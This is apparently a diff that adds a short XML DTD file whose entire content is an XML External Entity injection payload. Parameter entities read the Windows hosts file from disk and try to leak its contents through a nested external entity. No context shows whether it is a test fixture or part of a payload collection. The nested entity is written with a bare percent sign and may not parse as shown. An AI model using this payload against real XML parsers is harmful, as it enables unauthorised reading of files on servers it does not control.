@@ -1,0 +1,4 @@
+<!ENTITY % data SYSTEM "file:///C:/windows/system32/drivers/etc/hosts">
+<!ENTITY % eval "<!ENTITY % leak SYSTEM '%data;'>">
+%eval;
+%leak;
